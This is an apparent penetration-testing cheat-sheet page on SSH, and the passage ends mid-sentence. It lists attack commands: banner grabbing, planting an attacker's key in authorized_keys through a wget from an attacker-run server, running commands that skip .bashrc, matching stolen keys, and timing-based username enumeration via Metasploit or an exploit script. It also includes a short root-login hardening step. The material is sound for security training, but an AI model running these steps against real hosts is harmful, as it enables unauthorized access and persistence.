# 22 - SSH

## Theory

SSH, or **Secure Shell** or Secure Socket Shell, is a network protocol that provides users with a secure way to access a computer over an unsecured network.

{% hint style="success" %}
Attempt a SSH connection blindly (if we do not find any vulnerability) because sometimes we get a banner and we can get some information.
{% endhint %}

## Practice

### [Authentication](../general/lateral-movement/remote-services.md#ssh-lateral-movement)

### Banner grabbing

```bash
nc -vn <IP> 22
```

### SSH keys

For authentication with SSH keys, we can do it in 2 ways:

{% tabs %}
{% tab title="Way #1" %}
Create **SSH keys** on the compromised machine:

```bash
ssh-keygen # "Enter" all the time.
```

Rename the public key to "**authorized\_keys**":

```bash
mv id_rsa-pub authorized_keys
```

We copy the **id\_rsa** (private key) from the compromised machine to our system, and use it to authenticate:

```bash
ssh -i id_rsa <USERNAME>@<IP>
```
{% endtab %}

{% tab title="Way #2" %}
Create the **SSH keys** on our system:

```bash
ssh-keygen # "Enter" all the time.
```

We rename the file **id\_rsa.pub** (public key) to "**authorized\_keys**" and **transfer** it to the compromised machine, in the path `~/.ssh/authorized_keys`:

```bash
# On our attacking machine:
mv id_rsa.pub authorized_keys
sudo python3 -m http.server 80
# On the compromised machine:
wget http://<LHOST>/authorized_keys -O ~/.ssh/authorized_keys
```
{% endtab %}
{% endtabs %}

### Execute commands

```bash
# Spawn bash:
ssh <USER>@<IP> "<COMMAND>" 
ssh <USER>@<IP> -t "bash -l"
# Do not load the .bashrc file.
ssh <USER>@<IP> -f 'mv .bashrc .bashrc_bk; exit'
ssh <USER>@<IP> 'bash --norc'
```

### Fingerprint

#### How to check if SSH keys are valid with each other?

Sometimes, when we compromise a machine, we get the **authorized\_keys** (public key) and the **id\_rsa** (private key). However, **these keys may be unrelated**. To **verify** them, we **need both keys** and perform the following **commands**:

```bash
ssh-keygen -l -f authorized_keys
ssh-keygen -l -f id_rsa
```

If we see the same, both are related and it may be another factor why it is not letting us log in, such as restricted users in the **sshd\_config** file, etc. If they are not the same, you will have to look for other keys that are related or forget about that input vector.

#### SSH `from` directive

Specifies that in addition to public key authentication, the canonical name of the remote host or its IP address must be present in the comma-separated list of patterns. Example of an **authorized\_keys** with this directive:

```bash
from="*.example.test.com" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6C
cwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP
/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewP
cafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1
tcJSPEn7WOD test@xd
```

In this case, it is from a domain, that we could try to add it with [nsupdate](53-dns/attack-techniques/dynamic-updates.md).

### Username enumeration

In some versions of OpenSSH you can do a timing attack to enumerate users. You can use a Python script or use a Metasploit module to exploit this:

```bash
# Metasploit
use scanner/ssh/ssh_enumusers
# Python script:
searchsploit -m linux/remote/45939.py
python 45939.py <IP> <USERNAME>
```

### Config files

```bash
ssh_config, sshd_config, authorized_keys, ssh_known_hosts, .shosts
```

{% hint style="danger" %}
Examining the /etc/ssh/sshd\_config file is very important, as you can see the port on which you listen (usually port 22), the users that are allowed to log in via SSH (AllowUsers property), whether you allow login with root (PermitRootLogin), etc.
{% endhint %}

### Root login

By default most SSH server implementation will allow root login, it is advised to disable it because if the credentials of this accounts leaks, attackers will get administrative privileges directly and this will also allow attackers to conduct bruteforce attacks on this account.

**How to disable root login for openSSH:**

1. Edit SSH server configuration `sudoedit /etc/ssh/sshd_config`
2. Change `#PermitRootLogin yes` into `PermitRootLogin no`
3. Take into account configuration changes: `sudo systemctl daemon-reload`
4. Restart the SSH server `sudo systemctl restart sshd`

## Troubleshooting

### Key exchange/encryption/host key (No matching)

```bash
# No matching key exchange method found:
ssh <IP> -oKexAlgorithms=+<KEY_EXCHANGE>
# No matching cipher found (with key exchange):
ssh <IP> -oKexAlgorithms=+<KEY_EXCHANGE> -c <CIPHER>
# No matching host key type found:
ssh <IP> -oHostKeyAlgorithms=+<HOST_KEY_TYPE>
```

### Problem in ssh2john

If we get the following message....:

```bash
AttributeError: module 'base64' has no attribute 'decodestring'
```

... we can solve this by editing a line in the **ssh2john** script:
